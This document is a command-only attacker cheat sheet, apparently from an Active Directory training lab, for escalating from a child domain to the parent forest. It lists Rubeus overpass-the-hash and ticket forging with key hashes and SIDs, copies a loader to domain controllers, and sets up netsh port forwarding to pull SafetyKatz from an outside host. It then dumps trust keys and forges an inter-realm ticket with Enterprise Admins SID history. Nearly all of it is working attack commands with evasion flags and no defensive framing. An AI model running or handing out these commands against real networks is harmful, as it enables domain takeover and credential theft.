#### OPtH + obtain trust key
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe

$null | winrs -r:dcorp-dc "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
```

```powershell
winrs -r:dcorp-dc cmd

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

Forge interrealm TGT
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args evasive-silver /service:krbtgt/DOLLARCORP.MONEYCORP.LOCAL /rc4:2a362666cdb9580fefb48d0bdf8d7e9b /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /ldap /user:Administrator /nowrap

```

Use ticket
```powershell
C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgs /service:http/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:

C:\Users\Public\Loader.exe -path C:\Users\Public\Rubeus.exe -args asktgs /service:cifs/mcorp-dc.MONEYCORP.LOCAL /dc:mcorp-dc.MONEYCORP.LOCAL /ptt /ticket:
```

```powershell
winrs -r:mcorp-dc.MONEYCORP.LOCAL cmd
```

Parent domain Cross trust
```powershell
echo F | xcopy C:\Users\Public\Loader.exe \\mcorp-dc.MONEYCORP.LOCAL\C$\Users\Public\Loader.exe

$null | winrs -r:mcorp-dc.MONEYCORP.LOCAL "netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.48"
```

```powershell
winrs -r:mcorp-dc.MONEYCORP.LOCAL cmd

C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-trust /patch" "exit"
```

